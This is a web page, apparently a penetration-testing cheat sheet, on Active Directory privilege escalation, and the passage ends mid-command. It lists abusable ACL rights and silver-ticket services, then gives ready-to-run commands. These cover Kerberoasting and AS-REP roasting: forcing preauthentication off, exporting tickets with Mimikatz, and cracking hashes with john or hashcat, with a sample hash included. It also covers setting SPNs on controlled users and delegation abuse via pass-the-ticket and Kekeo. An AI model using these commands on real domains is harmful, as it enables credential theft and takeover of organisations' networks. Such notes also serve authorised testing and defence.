<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="readloud">
    
    <link rel="shortcut icon" href="../../../img/favicon.ico">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Privesc - readloud.org</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "PRIV ESC", url: "#_top", children: [
              {title: "USEFULL OBJECT PERMISSION", url: "#usefull-object-permission" },
              {title: "SERVICE SILVER TICKET", url: "#service-silver-ticket" },
              {title: "TARGETING AN ADMIN WITH SMART CARD OTP", url: "#targeting-an-admin-with-smart-card-otp" },
              {title: "WELL-KNOWN SECURITY IDENTIFIERS. (S-1-5-21domain)", url: "#well-known-security-identifiers-s-1-5-21domain" },
              {title: "KERBEROASTING", url: "#kerberoasting" },
              {title: "SET SPN", url: "#set-spn" },
              {title: "KERBEROS DELEGATION", url: "#kerberos-delegation" },
              {title: "DNS ADMIN PE", url: "#dns-admin-pe" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    

    <h2 id="priv-esc">PRIV ESC</h2>
<hr />
<h4 id="usefull-object-permission">USEFULL OBJECT PERMISSION</h4>
<table>
<thead>
<tr>
<th>Rights</th>
<th>Permission</th>
</tr>
</thead>
<tbody>
<tr>
<td>GenericAll</td>
<td>Full rights to the object (add users to a group or reset user's password)</td>
</tr>
<tr>
<td>GenericWrite</td>
<td>Update object's attributes (i.e logon script)</td>
</tr>
<tr>
<td>WriteOwner</td>
<td>Change object owner to attacker controlled user take over the object</td>
</tr>
<tr>
<td>WriteDACL</td>
<td>Modify object's ACEs and give attacker full control right over the object</td>
</tr>
<tr>
<td>AllExtendedRights</td>
<td>Ability to add user to a group or reset password</td>
</tr>
<tr>
<td>ForceChangePassword</td>
<td>Ability to change user's password</td>
</tr>
<tr>
<td>Self (Self-Membership)</td>
<td>Ability to add yourself to a group</td>
</tr>
</tbody>
</table>
<hr />
<h4 id="service-silver-ticket">SERVICE SILVER TICKET</h4>
<table>
<thead>
<tr>
<th>Service Type</th>
<th>Service Silver Ticket</th>
</tr>
</thead>
<tbody>
<tr>
<td>WMI</td>
<td>HOST + RPCSS</td>
</tr>
<tr>
<td>PSRemote</td>
<td>HOST + HTTP or WSMAN + RPCSS (Depending on OS version)</td>
</tr>
<tr>
<td>WinRM</td>
<td>HOST + HTTP</td>
</tr>
<tr>
<td>Scheduled Tasks</td>
<td>HOST</td>
</tr>
<tr>
<td>Windows File Share (CIFS)</td>
<td>CIFS</td>
</tr>
<tr>
<td>LDAP including DCSync</td>
<td>LDAP</td>
</tr>
<tr>
<td>Windows RSAT</td>
<td>RPCSS + LDAP + CIFS</td>
</tr>
</tbody>
</table>
<hr />
<h4 id="targeting-an-admin-with-smart-card-otp">TARGETING AN ADMIN WITH SMART CARD OTP</h4>
<table>
<thead>
<tr>
<th>Type</th>
<th>CLEAR-TEXT</th>
<th>PTH</th>
<th>PTT</th>
<th>TOKEN</th>
</tr>
</thead>
<tbody>
<tr>
<td>SMART CARD</td>
<td>PROTECTED</td>
<td>NO PROTECTED</td>
<td>NO PROTECTED</td>
<td>NO PROTECTED</td>
</tr>
</tbody>
</table>
<p>:information_source: The reason behind it is that a TGT ticket presents a “post-authentication user session”, so we’re already authenticated as a 2-FA token, and there’s no way to identify that the TGT was reused by a malicious actor.
As long as the TGT hasn’t expired, the ticket will stay valid.</p>
<hr />
<h4 id="well-known-security-identifiers-s-1-5-21domain">WELL-KNOWN SECURITY IDENTIFIERS. (S-1-5-21domain)</h4>
<table>
<thead>
<tr>
<th>Property flag</th>
<th>Value in hexadecimal</th>
</tr>
</thead>
<tbody>
<tr>
<td>500</td>
<td>Administrator</td>
</tr>
<tr>
<td>501</td>
<td>Guest</td>
</tr>
<tr>
<td>502</td>
<td>KRBTGT</td>
</tr>
<tr>
<td>512</td>
<td>Domain Admins</td>
</tr>
<tr>
<td>513</td>
<td>Domain Users</td>
</tr>
<tr>
<td>514</td>
<td>Domain Guests</td>
</tr>
<tr>
<td>515</td>
<td>Domain Computers</td>
</tr>
<tr>
<td>516</td>
<td>Domain Controllers</td>
</tr>
<tr>
<td>517</td>
<td>Cert Publishers</td>
</tr>
<tr>
<td>518</td>
<td>Schema Admins</td>
</tr>
<tr>
<td>519</td>
<td>Enterprise Admins</td>
</tr>
<tr>
<td>520</td>
<td>Group Policy Creator Owners</td>
</tr>
<tr>
<td>526</td>
<td>Key Admins</td>
</tr>
<tr>
<td>527</td>
<td>Enterprise Key Admins</td>
</tr>
<tr>
<td>553</td>
<td>RAS and IAS Servers</td>
</tr>
<tr>
<td>---</td>
<td></td>
</tr>
<tr>
<td>#### KERBEROAST</td>
<td></td>
</tr>
<tr>
<td>Main objective: Search account with SPN and crack TGS ticket</td>
<td></td>
</tr>
<tr>
<td>- Find user accounts</td>
<td></td>
</tr>
<tr>
<td><div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">Get-NetUser</span> <span class="n">-SPN</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="nb">Get-NetUser</span> <span class="n">-SPN</span> <span class="p">|</span> <span class="nb">Format-List</span> <span class="n">name</span><span class="p">,</span><span class="n">distinguishedName</span><span class="p">,</span><span class="n">servicePrincipalName</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="c">#</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">ServicePrincipalName</span> <span class="o">-ne</span> <span class="s2">&quot;$null&quot;</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">ServicePrincipalName</span>
</span></code></pre></div></td>
<td></td>
</tr>
<tr>
<td>- Request a TGS</td>
<td></td>
</tr>
<tr>
<td><div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">Request-SPNTicket</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="c">#</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="nb">Add-Type</span> <span class="n">-AssemblyName</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;MSSQLSvc/lab-mgmt.domain.local&quot;</span>
</span></code></pre></div></td>
<td></td>
</tr>
<tr>
<td>- Check if the TGS has been granted</td>
<td></td>
</tr>
<tr>
<td><div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="n">klist</span>
</span></code></pre></div></td>
<td></td>
</tr>
<tr>
<td>- Export all tickets using Mimikatz</td>
<td></td>
</tr>
<tr>
<td><div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;kerberos::list /export&quot;&#39;</span>
</span></code></pre></div></td>
<td></td>
</tr>
<tr>
<td>- Crack the Service account password</td>
<td></td>
</tr>
<tr>
<td><div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="n">python</span><span class="p">.</span><span class="n">exe</span> <span class="p">.\</span><span class="n">tgsrepcrack</span><span class="p">.</span><span class="n">py</span> <span class="p">.\</span><span class="n">password</span><span class="p">.</span><span class="n">list</span> <span class="p">.\</span><span class="n">2</span><span class="p">-</span><span class="n">40a10000-jane</span><span class="nv">@MSSQLSvc</span><span class="p">~</span><span class="n">lab-mgmt</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local-DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">.</span><span class="n">kirbi</span>
</span></code></pre></div></td>
<td></td>
</tr>
</tbody>
</table>
<hr />
<h4 id="kerberoasting">KERBEROASTING</h4>
<p>Main objective: If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline</p>
<p>:information_source: With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled</p>
<ul>
<li>Find user accounts with Kerberos Preauth disabled (Using PowerView dev)
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-PreauthNotRequired</span> <span class="n">-Verbose</span>
</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c">#</span>
</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">DoesNotRequirePreAuth</span> <span class="o">-eq</span> <span class="nv">$True</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">DoesNotRequirePreAuth</span>
</span></code></pre></div></li>
<li>Find user accounts and force Preauth to disabled, enumerate the permissions for RDPUsers on ACLs using PowerView (dev)
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">Invoke-ACLScanner</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">IdentityReferenceName</span> <span class="o">-match</span> <span class="s2">&quot;RDPUsers&quot;</span><span class="p">}</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="c"># 4194304 -&gt; Value in decimal for DONT_REQ_PREAUTH</span>
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="n">controleduser</span> <span class="n">-XOR</span> <span class="p">@{</span><span class="n">useraccountcontrol</span><span class="p">=</span><span class="n">4194304</span><span class="p">}</span> <span class="n">-Verbose</span>
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="nb">Get-DomainUser</span> <span class="n">-PreauthNotRequired</span> <span class="n">-Verbose</span>
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="c">#</span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="nb">Get-DomainUser</span> <span class="n">-PreauthNotRequired</span> <span class="n">-Identity</span> <span class="n">controleduser</span>
</span></code></pre></div></li>
</ul>
<p>You can view and edit these attributes by using either the Ldp.exe tool or the Adsiedit.msc snap-in.</p>
<p>The following table lists possible flags that you can assign. You cannot set some of the values on a user or computer object because these values can be set or reset only by the directory service. Note that Ldp.exe shows the values in hexadecimal. Adsiedit.msc displays the values in decimal. The flags are cumulative. To disable a user's account, set the UserAccountControl attribute to 0x0202 (0x002 + 0x0200). In decimal, this is 514 (2 + 512).</p>
<p>Note You can directly edit Active Directory in both Ldp.exe and Adsiedit.msc. Only experienced administrators should use these tools to edit Active Directory. Both tools are available after you install the Support tools from your original Windows installation media. 
| Property flag     | Value in hexadecimal  | Value in decimal  |
|---    |---    |---    |
| SCRIPT<br>The logon script will be run.   | 0x0001    | 1
| ACCOUNTDISABLE<br>The user account is disabled.   | 0x0002    | 2
| HOMEDIR_REQUIRED<br>The home folder is required.  | 0x0008    | 8
| LOCKOUT   | 0x0010    | 16
| PASSWD_NOTREQD<br>No password is required.    | 0x0020    | 32
| PASSWD_CANT_CHANGE<br>The user cannot change the password. This is a permission on the user's object.     | 0x0040    | 64
| ENCRYPTED_TEXT_PWD_ALLOWED<br>The user can send an encrypted password.    | 0x0080    | 128
| TEMP_DUPLICATE_ACCOUNT<br>This is an account for users whose primary account is in another domain. This account provides user access to this domain, but not to any domain that trusts this domain. This is sometimes referred to as a local user account.    | 0x0100    | 256
| NORMAL_ACCOUNT<br>This is a default account type that represents a typical user.  | 0x0200    | 512
| INTERDOMAIN_TRUST_ACCOUNT<br>This is a permit to trust an account for a system domain that trusts other domains.  | 0x0800    | 2048
| WORKSTATION_TRUST_ACCOUNT<br>This is a computer account for a computer that is running Microsoft Windows NT 4.0 Workstation, Microsoft Windows NT 4.0 Server, Microsoft Windows 2000 Professional, or Windows 2000 Server and is a member of this domain.     | 0x1000    | 4096
| SERVER_TRUST_ACCOUNT<br>This is a computer account for a domain controller that is a member of this domain.   | 0x2000    | 8192
| DONT_EXPIRE_PASSWORD<br>Represents the password, which should never expire on the account.    | 0x10000   | 65536
| MNS_LOGON_ACCOUNT<br>This is an MNS logon account.    | 0x20000   | 131072
| SMARTCARD_REQUIRED<br>When this flag is set, it forces the user to log on by using a smart card.  | 0x40000   | 262144
| TRUSTED_FOR_DELEGATION<br>When this flag is set, the service account (the user or computer account) under which a service runs is trusted for Kerberos delegation. Any such service can impersonate a client requesting the service. To enable a service for Kerberos delegation, you must set this flag on the userAccountControl property of the service account.   | 0x80000   | 524288
| NOT_DELEGATED<br>When this flag is set, the security context of the user is not delegated to a service even if the service account is set as trusted for Kerberos delegation.     | 0x100000  | 1048576
| USE_DES_KEY_ONLY<br>(Windows 2000/Windows Server 2003) Restrict this principal to use only Data Encryption Standard (DES) encryption types for keys.  | 0x200000  | 2097152
| DONT_REQ_PREAUTH<br>(Windows 2000/Windows Server 2003) This account does not require Kerberos pre-authentication for logging on.  | 0x400000  | 4194304
| PASSWORD_EXPIRED<br>(Windows 2000/Windows Server 2003) The user's password has expired.   | 0x800000  | 8388608
| TRUSTED_TO_AUTH_FOR_DELEGATION<br>(Windows 2000/Windows Server 2003) The account is enabled for delegation. This is a security-sensitive setting. Accounts that have this option enabled should be tightly controlled. This setting lets a service that runs under the account assume a client's identity and authenticate as that user to other remote servers on the network.   | 0x1000000     | 16777216
| PARTIAL_SECRETS_ACCOUNT<br>(Windows Server 2008/Windows Server 2008 R2) The account is a read-only domain controller (RODC). This is a security-sensitive setting. Removing this setting from an RODC compromises security on that server.    | 0x04000000    | 67108864</p>
<p>These are the default UserAccountControl values for the certain objects:
* Typical user : 0x200 (512)
* Domain controller : 0x82000 (532480)
* Workstation/server: 0x1000 (4096)</p>
<ul>
<li>Request encrypted AS-REP for offline brute-force
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">Get-ASREPHash</span> <span class="n">-UserName</span> <span class="n">controleduser</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>All users with Kerberos preauth disabled and request a hash
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nb">Invoke-ASREPRoast</span> <span class="n">-Verbose</span>
</span></code></pre></div></li>
<li>
<p>Check if you can crack with john
<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="nv">$krb5asrep$controleduser</span>@domain.local:13d55a1f0b1aa3c39a3c5a6815f40ee3<span class="nv">$ee68bfe89b0fd40326189cf255a148957bd1d2900cce75fb3f3db56c4086e2d207641a1f5744fd9505ba39d0238b6828b6311eb049d6ee82e8d1deac23f61e252</span>
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>ef6aaa7997a3445334280178bb5483f445a0e5156512f9421edfdd2b2dc04a3dddf951c90fbe647f01dd7f14a97a89ab96f89e3acc3cdfd113fa214fe10ee53cc47e99929e9358ba215cd161855d8945e7b2e9dacd4e16a77d53fbaedbb486dfb5a4726ed1d3f395618
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>6d1dbbe33b9fe6cd1d19e0993193cebd1f80c3fdfb2265fe7a6b6690d488400a80f272650a4a89dd84a1ce17651c103ae498226ab569e953998e4f1823e18632ede548a4c38923a5cb5ed6d1c49f5edf475f0f5690617dee6f898dfcd52e
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>john<span class="w"> </span>controleduser.txt<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
</span></code></pre></div></p>
</li>
<li>
<p>Check if you can crack with hashcat, need add $23 
<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="nv">$krb5asrep$23$controleduser</span>@domain.local:13d55a1f0b1aa3c39a3c5a6815f40ee3<span class="nv">$ee68bfe89b0fd40326189cf255a148957bd1d2900cce75fb3f3db56c4086e2d207641a1f5744fd9505ba39d0238b6828b6311eb049d6ee82e8d1deac23f61e252</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>ef6aaa7997a3445334280178bb5483f445a0e5156512f9421edfdd2b2dc04a3dddf951c90fbe647f01dd7f14a97a89ab96f89e3acc3cdfd113fa214fe10ee53cc47e99929e9358ba215cd161855d8945e7b2e9dacd4e16a77d53fbaedbb486dfb5a4726ed1d3f395618
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>6d1dbbe33b9fe6cd1d19e0993193cebd1f80c3fdfb2265fe7a6b6690d488400a80f272650a4a89dd84a1ce17651c103ae498226ab569e953998e4f1823e18632ede548a4c38923a5cb5ed6d1c49f5edf475f0f5690617dee6f898dfcd52e
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">18200</span><span class="w"> </span>controleduser.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>-o<span class="w"> </span>cracked
</span></code></pre></div></p>
</li>
</ul>
<hr />
<h4 id="set-spn">SET SPN</h4>
<p>With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything</p>
<ul>
<li>Enumerate the permissions for RDPUsers on ACLs using PowerView (dev)
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="nb">Invoke-ACLScanner</span> <span class="n">-ResolveGUIDs</span> <span class="p">|</span> <span class="p">?{</span><span class="nv">$_</span><span class="p">.</span><span class="n">IdentityReferenceName</span> <span class="o">-match</span> <span class="s2">&quot;RDPUsers&quot;</span><span class="p">}</span>
</span></code></pre></div></li>
<li>Using Powerview (dev), see if the user already has a SPN
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-Identity</span> <span class="n">mike</span> <span class="p">|</span> <span class="nb">select </span><span class="n">serviceprincipalname</span>
</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="nb">Get-ADUser</span> <span class="n">-Identity</span> <span class="n">mike</span> <span class="n">-Properties</span> <span class="n">ServicePrincipalName</span> <span class="p">|</span> <span class="nb">select </span><span class="n">ServicePrincipalName</span>
</span></code></pre></div></li>
<li>Set a SPN for the user
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="n">mike</span> <span class="n">-Set</span> <span class="p">@{</span><span class="n">serviceprincipalname</span><span class="p">=</span><span class="s1">&#39;domain/whatever1&#39;</span><span class="p">}</span>
</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="nb">Set-ADUser</span> <span class="n">-Identity</span> <span class="n">mike</span> <span class="n">-ServicePrincipalNames</span> <span class="p">@{</span><span class="n">Add</span><span class="p">=</span><span class="s1">&#39;domain/whatever1&#39;</span><span class="p">}</span>
</span></code></pre></div></li>
<li>Request a ticket
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="nb">Request-SPNTicket</span>
</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="c">#</span>
</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="nb">Add-Type</span> <span class="n">-AssemblyNAme</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span>
</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IdentityModel</span><span class="p">.</span><span class="n">Tokens</span><span class="p">.</span><span class="n">KerberosRequestorSecurityToken</span> <span class="n">-ArgumentList</span> <span class="s2">&quot;domain/whatever1&quot;</span>
</span></code></pre></div></li>
<li>Check if the ticket has been granted
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">klist</span>
</span></code></pre></div></li>
<li>Export all tickets using Mimikatz
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;kerberos::list /export&quot;&#39;</span>
</span></code></pre></div></li>
<li>Crack the Service account password
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">python</span><span class="p">.</span><span class="n">exe</span> <span class="p">.\</span><span class="n">tgsrepcrack</span><span class="p">.</span><span class="n">py</span> <span class="p">.\</span><span class="n">password</span><span class="p">.</span><span class="n">list</span> <span class="p">.\</span><span class="n">2</span><span class="p">-</span><span class="n">40a10000-jane</span><span class="nv">@MSSQLSvc</span><span class="p">~</span><span class="n">lab-mgmt</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local-DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">.</span><span class="n">kirbi</span>
</span></code></pre></div></li>
</ul>
<hr />
<h4 id="kerberos-delegation">KERBEROS DELEGATION</h4>
<p>Main objective: Allows to "reuse the end-user credentials to access resources hosted on a different server"</p>
<ul>
<li>
<p>Unconstrained Delegation</p>
<p>Allows delegation to any service to any resource on the domain as a user</p>
<ul>
<li>Discover domain computers which have unconstrained delegation enabled
    <div class="language-powershell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nb">Get-NetComputer</span> <span class="n">-UnConstrained</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="c">#</span>
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="nb">Get-ADComputer</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">TrustedForDelegation</span> <span class="o">-eq</span> <span class="nv">$True</span><span class="p">}</span>
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">TrustedForDelegation</span> <span class="o">-eq</span> <span class="nv">$True</span><span class="p">}</span>
</span></code></pre></div><ul>
<li>Check if any DA token is available
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;sekurlsa::tickets /export&quot;&#39;</span>
</span></code></pre></div></li>
<li>DA token reuse
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;kerberos::ptt C:\path\[0;xxxxxxx]-x-x-x-Administrator@krbtgt-LAB.DOMAIN.LOCAL.kirbi&quot;&#39;</span>
</span></code></pre></div></li>
</ul>
</li>
<li>Constrained Delegation</li>
</ul>
<p>Allows access only to specified services on specified computers as a user</p>
<ul>
<li>Enumerate users and computers with constrained delegation enabled PowerView (dev)
    <div class="language-powershell highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="nb">Get-DomainUser</span> <span class="n">-TrustedToAuth</span>
</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="nb">Get-DomainComputer</span> <span class="n">-TrustedToAuth</span>
</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="c">#</span>
</span><span id="__span-21-4"><a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="nb">Get-ADObject</span> <span class="n">-Filter</span> <span class="p">{</span><span class="n">msDS-AllowedToDelegateTo</span> <span class="o">-ne</span> <span class="s2">&quot;$null&quot;</span><span class="p">}</span> <span class="n">-Properties</span> <span class="n">msDS-AllowedToDelegateTo</span>
</span></code></pre></div><ul>
<li>Using asktgt from Kekeo, we request a TGT
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="p">.\</span><span class="n">kekeo</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="n">tgt</span><span class="p">::</span><span class="n">ask</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">aimavc</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">lab</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span> <span class="n">rc4</span><span class="p">:</span><span class="n">00000000000000000000000000000000</span>
</span></code></pre></div></li>
<li>Using s4u from Kekeo, we request a TGS
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="n">tgs</span><span class="p">::</span><span class="n">s4u</span> <span class="p">/</span><span class="n">tgt</span><span class="p">:</span><span class="n">TGT_aimsvc</span><span class="nv">@LAB</span><span class="p">.</span><span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL_krbtgt</span><span class="p">~</span><span class="n">lab</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="nv">@LAB</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">Administrator</span><span class="nv">@lab</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="p">/</span><span class="n">service</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">domain-service</span><span class="p">.</span><span class="n">lab</span><span class="p">.</span><span 